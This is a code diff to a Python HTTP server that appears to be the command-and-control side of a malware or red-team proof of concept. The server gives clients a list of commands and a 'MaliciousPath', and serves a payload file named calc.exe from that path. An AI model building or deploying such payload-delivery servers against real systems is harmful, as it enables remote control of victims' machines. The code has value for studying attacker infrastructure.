@@ -27,7 +27,11 @@ def ConfigurationServer():
         hostPort = confFileJson['Port']
         UUID = confFileJson['UUID']
         MaliciousPath = confFileJson['MaliciousPath']
-        Commands = confFileJson['Commands']
+
+        f = open('commands.txt', 'r')
+        Commands = f.read().splitlines()
+        f.close()
+        #Commands = confFileJson['Commands']
 
         #This is the configuration for the client side
         Configuration = {'Server': hostName, 'Commands':Commands,'MaliciousPath': MaliciousPath}
@@ -43,10 +47,10 @@ class MyServer(BaseHTTPRequestHandler):
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
                 self.wfile.write(json.dumps(Configuration).encode())
-                #print(json.dumps(Configuration).encode())
+                print(json.dumps(Configuration).encode())
                 return
+
             if self.path.endswith(MaliciousPath):
-                print('HERE')
                 self.send_response(200)
                 self.send_header('Content-type', 'application/html')
                 self.send_header('FileName', 'calc.exe')
